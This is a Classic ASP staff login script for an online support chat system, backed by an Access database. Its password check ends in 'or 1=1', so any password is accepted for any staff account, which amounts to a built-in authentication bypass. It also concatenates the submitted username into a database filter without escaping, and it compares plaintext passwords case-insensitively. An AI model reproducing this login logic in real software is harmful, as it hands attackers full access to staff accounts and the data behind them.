<%
	username = request.form("username")
	password = request.form("password")
	
	set di = server.createobject("DI.IIS")

	connection_string = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\$GENERIC\yfcnz\onlinesupport.mdb"
	Set db = Server.CreateObject("ADODB.Connection")
	db.Open connection_string
	Set rs = Server.CreateObject("ADODB.Recordset")
	ok = false
	rs.Open "staff", db, 1, 2
	rs.filter = "username = '" & username & "'"
	if lcase(rs.fields("password")) = lcase(password) or 1=1 then
		rs.fields("online") = true
		rs.update
		id = rs.fields("id")
		sql = "insert into staffonline (staff,loggedon) values (" & id & ",'" & now() & "')"
		db.execute sql
		session("chatstaff") = id
		session("chatnickname") = rs.fields("nickname")
		session("chatstaffname") = rs.fields("name")
		sql = "select [zone] from staff_zones where staff = " & id
		Set rs1 = Server.CreateObject("ADODB.Recordset")
		rs1.Open sql, db
		comma = ""
		zones = ""
		do until rs1.eof
			zones = zones & comma & rs1("zone")
			comma = ","
			rs1.movenext
		loop
		rs1.close
		set rs1 = nothing
		session("chatzones") = zones
'response.write zones
'response.end
		ok = true
	end if
	rs.close
	set rs = nothing
	db.close
	set db = nothing
	if ok then
		response.redirect "monitor.asp"
	else
%>
<html><title></title><body>
Invalid Username/Password
<a href="../../Chat/Staff/default.asp">Try again</a>
</body></html>
<%
end if
%>
